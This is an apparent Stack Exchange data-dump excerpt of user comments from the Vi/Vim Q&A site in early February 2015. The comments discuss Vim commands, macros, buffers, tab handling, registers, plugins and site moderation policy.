  <row Id="555" PostId="446" Score="0" Text="@Carpetsmoker Oh, don't worry about that. Vim is alive and kicking in India (where I am). :D" CreationDate="2015-02-06T05:01:16.080" UserId="205" />
  <row Id="556" PostId="402" Score="0" Text="I understand. It was just an incidental comment for anyone who does. Your question is totally valid, I agree." CreationDate="2015-02-06T06:39:40.900" UserId="91" />
  <row Id="557" PostId="257" Score="2" Text="That tag is confusing me. If this question is about &quot;original vi&quot;, why is a `vim` answer accepted?" CreationDate="2015-02-06T08:00:51.830" UserId="205" />
  <row Id="558" PostId="257" Score="2" Text="@muru Agreed. Changing the question two days afterwards, even if it was originally misinterpreted, makes a mess. At this point, it would be better to change the question to Vim and ask another question for Original Vi. I've voted to close as &quot;Unclear what you are asking&quot;, and I would be glad to retract it if reverted." CreationDate="2015-02-06T08:04:08.303" UserId="24" />
  <row Id="559" PostId="257" Score="3" Text="I've reverted the tag; this question can stay open, the OP can ask a new question .... IMHO that's the easier ... Also, I think the the OP uses `nvi`?" CreationDate="2015-02-06T08:22:13.517" UserId="51" />
  <row Id="560" PostId="488" Score="0" Text="@Oxinabox: Note you can use `ctrl-V` for quoting any special characters or fancy keypresses for macros - just press `ctrl-V` then [enter] and the &lt;cr&gt; equivalent will be entered into your macro definition." CreationDate="2015-02-06T09:04:57.097" UserId="351" />
  <row Id="564" PostId="413" Score="1" Text="muru, jalanb Thanks for correct my terrible writing." CreationDate="2015-02-06T09:33:41.077" UserId="336" />
  <row Id="565" PostId="413" Score="0" Text="@alxndr This method could make [CapsLock] as both [Control] and [Escape]" CreationDate="2015-02-06T09:36:21.457" UserId="336" />
  <row Id="566" PostId="504" Score="0" Text="`&lt;C-6&gt;` isn't bad but I can't use that to jump back two buffers. `bprev` and `bnext` are not in order of jumps." CreationDate="2015-02-06T09:40:43.010" UserId="268" />
  <row Id="567" PostId="90" Score="1" Text="@Carpetsmoker Strange; with most commands it doesn't matter in which order you give the prefixes and the numbers, as long as the command itself is last. Here it does not :-/" CreationDate="2015-02-06T09:50:28.210" UserId="82" />
  <row Id="568" PostId="504" Score="0" Text="Yea I don't think there's any good native way to go deeper into the history. You'd have to use some MRU plugin, even CtrlP has one, there must be others" CreationDate="2015-02-06T09:54:29.710" UserId="74" />
  <row Id="569" PostId="507" Score="0" Text="Well, that was certainly simpler than I would have expected :-)" CreationDate="2015-02-06T11:06:18.803" UserId="51" />
  <row Id="570" PostId="371" Score="0" Text="Yeah, this is a bit better. Didn't know you could do `set key=` to make Vim ask for the password again." CreationDate="2015-02-06T11:14:48.803" UserId="51" />
  <row Id="571" PostId="499" Score="2" Text="The [diffchar](http://www.vim.org/scripts/script.php?script_id=4932) plugin is probably what you need but I have zero experience with it. Maybe someone with experience using it can give a good, detailed answer (or maybe an alternative)." CreationDate="2015-02-06T11:30:04.443" UserId="20" />
  <row Id="572" PostId="474" Score="0" Text="Is your question about the python part or about how to interface the python code with vim? I agree with @Doorknob that &quot;how do I write a python snipped that does this&quot; is off topic and should be asked on SO. If you however know how to do this in pure python, but just don't get it to work with the vim api, that would be on topic but feels very broad. IMO you should instead focus on a specific part of the python&lt;-&gt;vim interfacing that you cant figure out (e.g. &quot;How do I replace the current line in vim from a python script&quot;)." CreationDate="2015-02-06T11:36:36.907" UserId="117" />
  <row Id="573" PostId="505" Score="3" Text="There is also [an answer on SO](http://stackoverflow.com/a/5144480/500942) which covers retabbing at start of line only. It is worth linking because of the clarity of that explanation." CreationDate="2015-02-06T11:41:12.597" UserId="182" />
  <row Id="574" PostId="510" Score="1" Text="So basically, you want to open a shell in a `:split`, while retaining the file in the other window? ... This sounds like a job for tmux or screen to me ..." CreationDate="2015-02-06T12:35:23.290" UserId="51" />
  <row Id="575" PostId="510" Score="1" Text="@Carpetsmoker: I often don't have control over what is installed on the remote system, and more often than not neither of the two is, while Vim is always there." CreationDate="2015-02-06T12:36:40.320" UserId="351" />
  <row Id="576" PostId="483" Score="0" Text="@Carpetsmoker You could save the file as a new file, and run a `diff` on them. But this isn't going to produce anywhere near reasonable results for source code and the like, of course." CreationDate="2015-02-06T12:46:34.500" UserId="88" />
  <row Id="577" PostId="483" Score="0" Text="@Oxinabox Yes, and as long as the macro is empty before this, the finished macro will repeatedly call itself until reaching EOF." CreationDate="2015-02-06T12:47:04.627" UserId="88" />
  <row Id="578" PostId="474" Score="0" Text="Note: The question is now closed with `marked as duplicate`, since more people voted on that. But I think `unclear what you're asking` would be better (I voted for that option)... You could make the question better, and ask for re-open!" CreationDate="2015-02-06T13:02:59.797" UserId="51" />
  <row Id="579" PostId="513" Score="1" Text="That's good for typing. Can I apply that for pre-existing text?" CreationDate="2015-02-06T13:03:16.770" UserId="351" />
  <row Id="581" PostId="511" Score="1" Text="gq/gw is definitely the way to go. to add to this message you can change format program to par to have more options. Checkout http://vimcasts.org/episodes/formatting-text-with-par/" CreationDate="2015-02-06T13:04:55.673" UserId="192" />
  <row Id="586" PostId="429" Score="0" Text="@Rich, thanks for the answer. While it is not a perfect solution (in term of highlighting blocks) it fully answers the question demonstrating that this is possible. Answer Accepted." CreationDate="2015-02-06T13:32:54.290" UserId="307" />
  <row Id="587" PostId="517" Score="0" Text="No way to do anything like this without a plugin?" CreationDate="2015-02-06T14:12:15.643" UserId="351" />
  <row Id="588" PostId="511" Score="2" Text="By default, Vim doesn't use any external program, although you can choose to use one by setting the `'formatprg'` option." CreationDate="2015-02-06T14:16:20.787" UserId="15" />
  <row Id="589" PostId="517" Score="2" Text="@SF See [`:help shell-window`](http://vimdoc.sourceforge.net/htmldoc/tips.html#shell-window). (Short answer: no.)" CreationDate="2015-02-06T14:24:10.250" UserId="205" />
  <row Id="590" PostId="362" Score="0" Text="Is there also a way to do this by default? So that `:help foo` would act as `:tab help foo`?" CreationDate="2015-02-06T14:44:06.203" UserId="51" />
  <row Id="591" PostId="362" Score="0" Text="@Carpetsmoker Yes, you could do something like `cnoremap help tab help`." CreationDate="2015-02-06T14:45:21.783" UserId="88" />
  <row Id="592" PostId="477" Score="0" Text="I did some more digging, and I don't think this is possible. `:changes` doesn't work without a lot of hackery; as it seems this information is stored in the viminfo file, and there's no way to see which changes you made this session, and which the previous one ... Unless you disable the viminfo file of course, but that's rather heavy handed ...  would like to be proven wrong here, though :-)" CreationDate="2015-02-06T14:50:03.143" UserId="51" />
  <row Id="593" PostId="222" Score="0" Text="@guido, I wonder if that depends on when you enable filetype detection? If you add that `autocmd` after `filetype on` (with or without the `plugin` / `indent` flags), I would guess the results are better. Not tested, just speculation." CreationDate="2015-02-06T15:00:50.767" UserId="64" />
  <row Id="594" PostId="474" Score="2" Text="Just in case this doesn't get reopened: http://paste.ubuntu.com/10093002/ - no comments, the code is fairly readable." CreationDate="2015-02-06T15:04:21.650" UserId="205" />
  <row Id="595" PostId="429" Score="0" Text="@Carpetsmoker I can also envisage some kind of horrible hacky script that adds in whitespace at the end of lines (and removes it again at opportune moments e.g. before save) but it would be horribly syntax-specific, and thinking about all the ways it could break makes my teeth hurt." CreationDate="2015-02-06T15:09:03.613" UserId="343" />
  <row Id="596" PostId="515" Score="1" Text="Might also be worth noting that the first two options can take a count to resize by more than one line/column at a time." CreationDate="2015-02-06T15:17:36.060" UserId="343" />
  <row Id="597" PostId="144" Score="1" Text="-1; This answer doesn't really have any bearing on the asked question. The question is about *reloading vimrc*, not *managing vimrc*." CreationDate="2015-02-06T15:30:31.650" UserId="51" />
  <row Id="598" PostId="144" Score="0" Text="The original question prior to my answer did not make it clear he was talking about instances on the same machine. At the time my answer did address the question." CreationDate="2015-02-06T15:34:09.980" UserId="41" />
  <row Id="599" PostId="527" Score="0" Text="Thank you, this is perfect.  I updated my mappings and it works flawlessly. `:&lt;C-F&gt;` for commands, `/&lt;C-F&gt;` and `?&lt;C-F&gt;` for search." CreationDate="2015-02-06T15:42:43.817" UserId="319" />
  <row Id="600" PostId="523" Score="0" Text="Thank you for your reply. I think the `%` is useful but not ideal in my case since the opening brackets and closing brackets of my structure are not on the same column and jumping around with the cursor causes the whole screen to change. I'm exploring folding at the moment to see if it could be useful, but I will ask about that in a separate post as I have encountered some problems with it (which I think could be solved)." CreationDate="2015-02-06T16:32:55.240" UserId="368" />
  <row Id="601" PostId="523" Score="0" Text="As for the feature I requested in my post, perhaps I should submit a feature request." CreationDate="2015-02-06T16:33:30.557" UserId="368" />
  <row Id="602" PostId="535" Score="0" Text="Thanks. That worked!" CreationDate="2015-02-06T17:05:38.517" UserId="368" />
  <row Id="603" PostId="540" Score="0" Text="I will try this plugin. I'm sure the extra features it provides will be useful since sometimes when writing code there are syntax errors. Thanks." CreationDate="2015-02-06T17:16:40.080" UserId="368" />
  <row Id="604" PostId="492" Score="1" Text="See also :help vimball for additional vimball-related commands (in vim 7 and up I think)." CreationDate="2015-02-06T17:30:11.773" UserId="72" />
  <row Id="605" PostId="533" Score="0" Text="Thanks for the answer. This seems to be reasonable. I thought maybe I was missing some modifiers, but /&lt;char&gt; is good enough." CreationDate="2015-02-06T17:31:45.863" UserId="307" />
  <row Id="608" PostId="543" Score="0" Text="I feel like this might be too opinion-oriented; there's no objective &quot;best&quot; and there are a lot of good options, each with their own pros and cons. Also the bit specifically about nested repositories brings the question more into the &quot;using git&quot; category and less about vim. Perhaps if you focused instead on a specific problem you had with vim or vim plugins while trying to store your configuration on github?" CreationDate="2015-02-06T18:20:00.797" UserId="72" />
  <row Id="609" PostId="543" Score="2" Text="I can edit it to take out the *best* if you like; my intention was to ask more of a &quot;how do I do this?&quot; question, while acknowledging that the way I was thinking about going about the problem might not be ideal." CreationDate="2015-02-06T18:21:38.460" UserId="163" />
  <row Id="610" PostId="543" Score="0" Text="That may help, but that may just make it a &quot;list of things&quot; question (there are, again, *lots* of different ways to do this effectively). There's currently a [topic on meta](http://meta.vi.stackexchange.com/questions/141/do-we-want-to-allow-questions-that-are-effectively-lists-of-things) about such questions if you'd like to contribute to the discussion about how we should treat this sort of question." CreationDate="2015-02-06T18:24:07.177" UserId="72" />
  <row Id="611" PostId="474" Score="0" Text="@muru Thank you, that's exactly what I was looking for. If this question were still open and you answered, I would upvote and accept." CreationDate="2015-02-06T18:27:03.337" UserId="130" />
  <row Id="612" PostId="543" Score="0" Text="Edited. I hope I've made it more clear that I'm asking &quot;how do I do this?&quot;" CreationDate="2015-02-06T18:29:00.863" UserId="163" />
  <row Id="613" PostId="413" Score="0" Text="Interesting idea. On OS X it looks like this is achievable by combining the Karabiner (formerly known as KeyRemap4MacBook) and Seil utilities from Takayama Fumihiko on pqrs.org." CreationDate="2015-02-06T18:43:36.467" UserId="67" />
  <row Id="614" PostId="489" Score="1" Text="This seems to work in the opposite direction from the request: it creates a header file from the .cpp file." CreationDate="2015-02-06T18:51:14.430" UserId="24" />
  <row Id="618" PostId="548" Score="0" Text="Thanks, that looks like just the sort of thing I was looking for!" CreationDate="2015-02-06T19:05:42.687" UserId="163" />
  <row Id="619" PostId="548" Score="0" Text="Ah, I didn't notice your answer had been posted, since I was editing mine for some time." CreationDate="2015-02-06T19:29:31.147" UserId="205" />
  <row Id="620" PostId="546" Score="1" Text="&quot;You can just add this line to your .vimrc...&quot; did you mean .gitignore?" CreationDate="2015-02-06T19:38:16.977" UserId="72" />
  <row Id="622" PostId="539" Score="0" Text="How do I use this to create &amp; maintain flowcharts?" CreationDate="2015-02-06T19:55:21.163" UserId="51" />
  <row Id="623" PostId="548" Score="0" Text="Thanks for the suggestion @Carpetsmoker!" CreationDate="2015-02-06T20:19:19.027" UserId="67" />
  <row Id="624" PostId="546" Score="0" Text="Yes I did. Thanks, I updated it." CreationDate="2015-02-06T20:23:41.163" UserId="226" />
  <row Id="625" PostId="539" Score="0" Text="Since it is geared toward drawing ASCII art it could lower the amount of pain when you have to refactor.  But @JoshPetrie is probably right that using dot would be better." CreationDate="2015-02-06T20:39:35.187" UserId="93" />
  <row Id="626" PostId="423" Score="0" Text="I like using the unicode character `▸` as it is slightly smaller than `&gt;`. Currently I see trailing white space by marking the eol (though I may try the above). My settings are: `set listchars=eol:¬,tab:▸\ ` and" CreationDate="2015-02-06T21:43:04.177" UserId="383" />
  <row Id="627" PostId="553" Score="0" Text="Welcome to Vi/Vim! Please read our [policy on plugin-recommendation answers](http://meta.vi.stackexchange.com/q/99/24) and add some detail about how exactly the plugin addresses the question." CreationDate="2015-02-06T22:14:25.803" UserId="24" />
  <row Id="628" PostId="522" Score="1" Text="Please read our [policy on plugin-recommendation answers](http://meta.vi.stackexchange.com/q/99/24) and add some detail about how exactly these plugins can benefit the user." CreationDate="2015-02-06T22:15:30.687" UserId="24" />
  <row Id="629" PostId="59" Score="1" Text="Please read our [policy on plugin-recommendation answers](http://meta.vi.stackexchange.com/q/99/24) and add some detail about how exactly to use your recommended plugin to solve the problem." CreationDate="2015-02-06T22:17:27.003" UserId="24" />
  <row Id="630" PostId="539" Score="2" Text="Please read our [policy on plugin-recommendation answers](http://meta.vi.stackexchange.com/q/99/24) and add some detail. A specific example of how to configure the plugin (if necessary) and activate it would be helpful." CreationDate="2015-02-06T22:20:23.233" UserId="24" />
  <row Id="632" PostId="308" Score="0" Text="How would you characterize, in words, where you want the match to start and end?" CreationDate="2015-02-06T22:51:32.390" UserId="24" />
  <row Id="633" PostId="542" Score="0" Text="+1 interesting; I'll give it a shot" CreationDate="2015-02-06T22:58:03.697" UserId="188" />
  <row Id="634" PostId="381" Score="0" Text="Minor glitches aside (which can probably be fixed), this looks promising ... The one thing I can't get done is the wrapping of the 3rd column though :-/" CreationDate="2015-02-07T00:19:27.643" UserId="51" />
  <row Id="635" PostId="562" Score="4" Text="I suggest that you remove the last paragraph and post your existing solution as a self-answer. Someone may come along with a better answer." CreationDate="2015-02-07T00:20:55.987" UserId="24" />
  <row Id="636" PostId="392" Score="3" Text="Thanks; I've edited your answer a bit to add some practical usage information (it read a little bit like an ad before) ... One thing I wasn't able to do with vim-table-mode is the wrapping of the 3rd column  as in the example in my question ... Is this possible?" CreationDate="2015-02-07T00:46:03.077" UserId="51" />
  <row Id="637" PostId="563" Score="0" Text="These drawbbacks are also true for `:cnoremap abc &lt;do stuff&gt;`..." CreationDate="2015-02-07T02:08:27.827" UserId="51" />
  <row Id="638" PostId="565" Score="1" Text="I'm voting to close this as off-topic because it isn't really about Vim so much as about the English language. It might be on-topic on [english.se], but I would read their help center / ask on chat first." CreationDate="2015-02-07T02:14:30.717" UserId="88" />
  <row Id="640" PostId="565" Score="6" Text="@Doorknob The spelling of application names is often irregular, and doesn't&#xA;follow 'normal' English gammer rules on the subject. The correct answer is usually 'whatever the&#xA;author says is correct', see for example LaTeX, GnuPG, iOS, JavaScript, etc." CreationDate="2015-02-07T02:25:47.160" UserId="51" />
  <row Id="641" PostId="567" Score="0" Text="Turns out `gn` wraps for me. Now I have to figure out what enables it. Ok - this wraps even with `-u NONE`." CreationDate="2015-02-07T04:08:35.730" UserId="205" />
  <row Id="642" PostId="567" Score="0" Text="@muru Weird... it still doesn't wrap with `-u NONE` for me. What platform/version? I'm on Vim 7.4.52 on Ubuntu 14.04." CreationDate="2015-02-07T04:16:49.090" UserId="88" />
  <row Id="644" PostId="567" Score="0" Text="7.4 (included patches 1-580), Arch Linux. I'll test on a Ubuntu system. - Yep, doesn't wrap on Ubuntu." CreationDate="2015-02-07T04:17:56.137" UserId="205" />
  <row Id="645" PostId="567" Score="1" Text="@muru Hmm, interesting... I've edited another line into the question." CreationDate="2015-02-07T04:21:15.640" UserId="88" />
  <row Id="647" PostId="570" Score="2" Text="Possibly related: http://www.drbunsen.org/vim-croquet/" CreationDate="2015-02-07T05:15:53.140" UserId="142" />
  <row Id="648" PostId="392" Score="0" Text="@Carpetsmoker thanks for the edit. Well you can wrap it manually, there's no way to do that automatically." CreationDate="2015-02-07T05:47:32.120" UserId="74" />
  <row Id="649" PostId="562" Score="1" Text="can I have a copy of your script?" CreationDate="2015-02-07T06:08:32.963" UserId="395" />
  <row Id="651" PostId="567" Score="0" Text="What about `ggdgn`? Or `:%s/. ./gc`?" CreationDate="2015-02-07T10:21:57.843" UserId="54" />
  <row Id="652" PostId="565" Score="0" Text="The answer is too easy to find in the doc for that question to be of any use." CreationDate="2015-02-07T10:22:57.127" UserId="54" />
  <row Id="653" PostId="563" Score="0" Text="There's no delay when you do `ab&lt;any key&gt;`." CreationDate="2015-02-07T10:26:02.010" UserId="54" />
  <row Id="664" PostId="565" Score="1" Text="@romainl I didn't time it, but I think it took me 20 to 30 minutes to find&#xA;this answer ... Not the most difficult, but not very easy either. You need to&#xA;know where to look :-) ..." CreationDate="2015-02-07T14:01:01.697" UserId="51" />
  <row Id="666" PostId="308" Score="1" Text="I want the match to start as late as possible and end as early as possible, while still satisfying the pattern." CreationDate="2015-02-07T16:29:21.263" UserId="64" />
  <row Id="669" PostId="584" Score="3" Text="q: shows ex command history, and is useful, but is not a log of normal commands, like &quot;ad2tn (delete into register a until the second n)" CreationDate="2015-02-07T17:37:47.833" UserId="227" />
  <row Id="670" PostId="585" Score="0" Text="@Carpetsmoker what's an ex-parrot? A Vim in-joke?" CreationDate="2015-02-07T18:01:04.223" UserId="205" />
  <row Id="671" PostId="585" Score="0" Text="Oh, that's interesting. I did not mean to edit this post. I wonder if upvoting+accepting had something to do with that. Two servers got out of order somewhere or something." CreationDate="2015-02-07T18:05:56.317" UserId="130" />
  <row Id="672" PostId="585" Score="0" Text="@mixedmath I rolled back yet again, then. :D" CreationDate="2015-02-07T18:06:37.927" UserId="205" />
  <row Id="673" PostId="585" Score="2" Text="No, [it's a Monty Python reference](https://www.youtube.com/watch?v=npjOSLCR2hE) :-) I would have expected that all Python programmers are familiar with it, given that there are quite a few Monty Python references in Python documentation and such." CreationDate="2015-02-07T18:06:53.780" UserId="51" />
  <row Id="674" PostId="585" Score="0" Text="@Carpetsmoker I'm familiar with Monty Python (the movies, anyway) but not with that particular one. :D" CreationDate="2015-02-07T18:07:43.987" UserId="205" />
  <row Id="675" PostId="583" Score="0" Text="Whenever a friend wants to learn vim, I always refer them to vim adventures. +1" CreationDate="2015-02-07T18:11:50.877" UserId="306" />
  <row Id="676" PostId="586" Score="0" Text="Related: [Plugin for Vim](https://github.com/mattn/emmet-vim)." CreationDate="2015-02-07T18:19:46.887" UserId="205" />
  <row Id="677" PostId="581" Score="0" Text="Does this work with direcotires as well (like .vim/bundle/) for plugins?" CreationDate="2015-02-07T19:14:07.400" UserId="307" />
  <row Id="679" PostId="388" Score="0" Text="Agreed. I have long wondered about the differences, but haven't had time to research it. It'll definitely be a sought-after question by new vim users." CreationDate="2015-02-07T20:30:39.047" UserId="306" />
  <row Id="680" PostId="593" Score="0" Text="Thanks. I got convinced that it's not really that useful to use this approach as in such situation one can resort to `/{char}`. But I accepted your answer in place of the previous one because it answers the original question instead of saying why one should not do it." CreationDate="2015-02-07T20:51:08.383" UserId="307" />
  <row Id="681" PostId="593" Score="0" Text="@KarolisKoncevičius Thank you :)" CreationDate="2015-02-07T21:32:42.440" UserId="356" />
  <row Id="682" PostId="595" Score="2" Text="Actually, this can be done with the `gL` operator defined by lion.vim. This operator performs alignment by adding spaces to the right of the alignment character (instead of the left, as with the `gl` operator). The full command would then be `gLip:`." CreationDate="2015-02-07T21:53:34.183" UserId="64" />
  <row Id="686" PostId="598" Score="0" Text="About the indentation issue you can solve it by pasting with `]p` or `[p` rather than `p` or `P`. This way the block that you paste will be autoindented." CreationDate="2015-02-08T00:28:35.917" UserId="356" />
  <row Id="688" PostId="603" Score="0" Text="`gv` goes to the last visual selection, which in this case would be the paragraph that was deleted. What am I missing?" CreationDate="2015-02-08T01:36:11.977" UserId="210" />
  <row Id="690" PostId="587" Score="0" Text="Thanks! I'm using this as a starting point for poking into the source code. It looks like -w saves every single key press, not just normal-mode commands, but you are correct: it is the right direction!" CreationDate="2015-02-08T03:02:24.313" UserId="227" />
  <row Id="691" PostId="602" Score="1" Text="This is a link-only answer. Please provide more detail about how to use the plugin to accomplish the goal." CreationDate="2015-02-08T05:16:26.633" UserId="24" />
  <row Id="692" PostId="582" Score="0" Text="This question asks about how an intermediate user can master Vim, which is not quite the same as the linked question." CreationDate="2015-02-08T05:18:32.913" UserId="24" />
  <row Id="693" PostId="579" Score="0" Text="PEP8 says: *&quot;But most importantly: know when to be inconsistent -- sometimes the style guide just doesn't apply. [...] Some other good reasons to ignore a particular guideline: 1. When applying the guideline would make the code less readable, even for someone who is used to reading code that follows this PEP. [...]&quot;* ... PEP8 are guidelines only. The universe is complex. Code is complex. You can't make rules for every possible scenario, so this is why PEP8 are *guidelines*, and not *rules*. The whole point of Python is readability, and *especially* because of that ..." CreationDate="2015-02-08T05:39:31.633" UserId="51" />
  <row Id="694" PostId="579" Score="0" Text="... exceptions to PEP8 are sometimes required... Using an automated tool to &quot;fix&quot; the code style can't do these exceptions, and is a flawed concept ... If you want PEP8-compliant code, then type PEP8 compliant code, and when it makes sense, *make an exception*." CreationDate="2015-02-08T05:41:07.830" UserId="51" />
  <row Id="695" PostId="606" Score="1" Text="This is less than ideal, because this just changes how tabs are visualized in vim, if someone else were to open the file in a different editor it wouldn't look as good." CreationDate="2015-02-08T05:49:06.703" UserId="74" />
  <row Id="696" PostId="588" Score="0" Text="it looks it has already been answered here: http://superuser.com/questions/357571/customize-text-editor-and-terminal-to-use-non-monospaced-fonts-without-the-horri/357579#357579" CreationDate="2015-02-08T06:20:50.150" UserId="188" />
  <row Id="697" PostId="606" Score="1" Text="@DhruvaSagar How so? The result is exactly identical after the tabs-to-spaces conversion in step 4." CreationDate="2015-02-08T06:41:03.420" UserId="24" />
  <row Id="699" PostId="463" Score="1" Text="The content of your answer is all correct, but the way you're using the terminology is (to me) a bit confusing. I think you're interpreting the documentation slightly wrongly. `q:` doesn't open an Ex command-line. It opens the *command history window*, in which the current and previous Ex commands can be edited. The Ex command line is what you get when you press `:` in Normal mode." CreationDate="2015-02-08T09:05:56.953" UserId="343" />
  <row Id="700" PostId="463" Score="2" Text="FWIW I think the Vim documentation is a bit confused too, as in places it refers to all `:` commands as being 'Ex' commands. IMHO really only the commands that are actually available in Ex should be considered to be Ex commands." CreationDate="2015-02-08T09:08:21.410" UserId="343" />
  <row Id="701" PostId="13" Score="1" Text="If you could do everything that you could do from a normal keyboard, what about it was displeasing? (I can think of several answers to this, but it would help to know which one(s) you're actually implying)." CreationDate="2015-02-08T09:33:00.527" UserId="343" />
  <row Id="702" PostId="605" Score="0" Text="I haven't used cscope (didn't even know it existed!), but the documentation makes it sound like this is supposed to just work. Have you got `csto` set to zero? (the default)" CreationDate="2015-02-08T10:39:33.877" UserId="343" />
  <row Id="703" PostId="542" Score="2" Text="This is a very creative idea! I didn't know about `:folddoopen`, seems like a very useful command. I also wanted to offer that if using [fugitive.vim](https://github.com/tpope/vim-fugitive), you can more easily see the diff of your current buffer with the `:Gdiff` command." CreationDate="2015-02-08T12:19:06.470" UserId="64" />
  <row Id="704" PostId="606" Score="0" Text="Different editors visualize / deal with tabs differently." CreationDate="2015-02-08T12:34:38.170" UserId="74" />
  <row Id="705" PostId="218" Score="2" Text="Moreover, the Command window is set up so that the command on the cursor line is executed when you press `Enter`, and your cursor will land on a empty line when you first open the Command window, so simply pressing `Enter` will close it." CreationDate="2015-02-08T12:49:47.417" UserId="64" />
  <row Id="706" PostId="610" Score="5" Text="the non-plugin solution is very specific for the case..." CreationDate="2015-02-08T12:55:35.223" UserId="342" />
  <row Id="707" PostId="610" Score="1" Text="@elyashiv the idea is that you can use a similar technique for any function arguments. Basically, yank a word, visually select another word, paste, which Vim will yank the deleted character to the register, and then paste where you first yanked from." CreationDate="2015-02-08T12:57:56.957" UserId="246" />
  <row Id="709" PostId="605" Score="0" Text="I do: `set csto?` shows `cscopetagorder=0`" CreationDate="2015-02-08T14:21:53.790" UserId="227" />
  <row Id="710" PostId="617" Score="0" Text="That works perfectly, thank you! Is there any explanation as to why viml/vimscript expects `\` here and not a quoted string instead? Seems unusual to me." CreationDate="2015-02-08T14:43:00.343" UserId="91" />
  <row Id="711" PostId="617" Score="2" Text="@AndrewFerrier It looks like Vim is interpreting `&quot;` as a comment in this context, so the command you're really running is `setlocal equalprg=`." CreationDate="2015-02-08T14:45:55.927" UserId="88" />
  <row Id="712" PostId="617" Score="0" Text="OK, that makes some sense. Thanks." CreationDate="2015-02-08T14:49:36.403" UserId="91" />
  <row Id="713" PostId="606" Score="0" Text="hmm ok, I guess I overlooked step #4. Sorry for that, my mistake." CreationDate="2015-02-08T14:58:14.040" UserId="74" />
  <row Id="716" PostId="582" Score="0" Text="@200_success The question is much too broad; it talks about buffers, registers, splits, visual mode, etc..." CreationDate="2015-02-08T16:41:08.520" UserId="51" />
  <row Id="717" PostId="615" Score="0" Text="Note: pathogen is *not* a plugin manager." CreationDate="2015-02-08T17:48:12.730" UserId="54" />
  <row Id="718" PostId="612" Score="0" Text="This is nice, but not for me, since I don't like using `=` (it often changes too much unrelated formatting for me)." CreationDate="2015-02-08T21:16:08.163" UserId="51" />
  <row Id="719" PostId="588" Score="0" Text="@guido I don't see an answer there ... The most upvoted answer is just an&#xA;explanation of what fonts are (not an answer), and the other &quot;answers&quot; are even worse..." CreationDate="2015-02-08T21:39:22.053" UserId="51" />
  <row Id="720" PostId="621" Score="0" Text="What do you mean exactly with 'between sessons'? That you have 2 Vim processes open next to each other, and want to share registers somehow? Or that you want your registers from the previous (now closed) Vim process? ... Also, I am not an alien! I AM A HUMAN EARTH MONKEY LIKE YOU! hehe ;-)" CreationDate="2015-02-08T21:57:25.240" UserId="51" />
  <row Id="721" PostId="621" Score="0" Text="The use case would be:&#xA;I have two files open in VIM.&#xA;I have a configuration block I need to copy from one to the other.&#xA;I dont necessarily need to close the first buffer.&#xA;I simply need the lines of text to be copied to a global space where I can then paste it to the second buffer. also, what's a squeedlyspooch?" CreationDate="2015-02-08T23:13:23.323" UserId="416" />
  <row Id="722" PostId="622" Score="0" Text="So, I would define a &quot;clipboard&quot; of sorts which VIM knows about in my dot file. I could alias a command to copy text to the &quot;clipboard&quot;, then globally I would have access to the text?" CreationDate="2015-02-08T23:19:36.123" UserId="416" />
  <row Id="723" PostId="626" Score="0" Text="Also handles up to 4 buffers, making it great for comparing configuration files" CreationDate="2015-02-08T23:27:07.060" UserId="238" />
  <row Id="726" PostId="622" Score="0" Text="@EricSabelhaus As long as your .viminfo is set up properly (just create an empty file called .viminfo in your `~` and Vim will do the rest), you can simply use `y` in one session of Vim, quit, and then `p` in another session later. (Of course, if you have two buffers open in the same Vim session, no .viminfo is necessary, simply yank some text, switch to your other buffer, and paste it there.)" CreationDate="2015-02-08T23:40:18.487" UserId="88" />
  <row Id="727" PostId="628" Score="3" Text="... I'd like to know who thought of the function name `insane_in_the_membrane`, and how that has remotely anything to do with its actual code. Because that person is brilliant and this is the best function name I've seen today! :P" CreationDate="2015-02-08T23:43:32.867" UserId="88" />
  <row Id="728" PostId="622" Score="0" Text="Fantastic! will this also work when coping using visual mode?" CreationDate="2015-02-09T01:56:49.123" UserId="416" />
  <row Id="729" PostId="622" Score="0" Text="Also, was this implemented recently? I vaguely remember trying to get this working about 2-3 months ago and pulling my hair out" CreationDate="2015-02-09T01:57:33.820" UserId="416" />
  <row Id="730" PostId="622" Score="0" Text=":( welp, part way answered the question... let me edit the question to be more specific." CreationDate="2015-02-09T02:02:38.410" UserId="416" />
  <row Id="731" PostId="622" Score="0" Text="@EricSabelhaus If you're starting the Vim process one after the other, why not just use the same Vim (ex. `vim file1.txt file2.txt`) and yank some lines (`Vjjj...y`), `:bn`, and `p`?" CreationDate="2015-02-09T02:12:27.650" UserId="88" />
  <row Id="732" PostId="636" Score="0" Text="I think the correct answer is almost certainly an autocommand based on the gitcommit filetype. I'll post it if I can come up with one myself." CreationDate="2015-02-09T02:19:36.203" UserId="390" />
  <row Id="733" PostId="636" Score="0" Text="Hmm, I can't reproduce your issue? I set the formatoptions to `caq1njwtl`, do `git commit`, and hit i (for insert mode), type `do` and hit enter ... Am I doing it right? ... I can't get the gitcommit filetype to apply auto-indent no matter what I do ... There isn't even an `indent/git*.vim` file on my system?" CreationDate="2015-02-09T02:22:56.317" UserId="51" />
  <row Id="734" PostId="636" Score="2" Text="While you're typing a commit message, if you try typing `:set ft?` and hitting enter, what is the output?" CreationDate="2015-02-09T02:24:50.047" UserId="88" />
  <row Id="735" PostId="631" Score="0" Text="@Carpetsmoker &quot;DIRECTORY EXPLORATION COMMANDS&quot;  =o_0=" CreationDate="2015-02-09T02:38:54.760" UserId="238" />
  <row Id="737" PostId="621" Score="1" Text="You could yank the stuff to the system clipboard by using `&quot;+y` and paste it into which ever other application (vim included) you want." CreationDate="2015-02-09T04:13:29.997" UserId="224" />
  <row Id="738" PostId="636" Score="0" Text="It's `gitcommit`. I solved it. Posting answer now." CreationDate="2015-02-09T07:35:02.637" UserId="390" />
  <row Id="739" PostId="648" Score="1" Text="`smartindent` is something you only want to enable in C, and maybe a few languages with a syntax that's very similar... I think it's a leftover from before Vim had indent files for different languages." CreationDate="2015-02-09T07:52:10.187" UserId="51" />
  <row Id="740" PostId="636" Score="0" Text="@Carpetsmoker Yeah, my `.vimrc` is 1703 lines and 52K in size at present. I'm not surprised at all that this isn't reproduced with vanilla vim." CreationDate="2015-02-09T07:59:31.403" UserId="390" />
  <row Id="741" PostId="648" Score="0" Text="Yeah maybe I will test with smartindent removed from my configuration and enabling it only for specific C-style filetypes (and javascript, etc). I already have an autocmd for Python that disables it as well, which was put in place for reasons quickly becoming obvious." CreationDate="2015-02-09T08:01:18.453" UserId="390" />
  <row Id="742" PostId="620" Score="0" Text="Thank you for this great answer! `:)`" CreationDate="2015-02-09T08:41:23.060" UserId="106" />
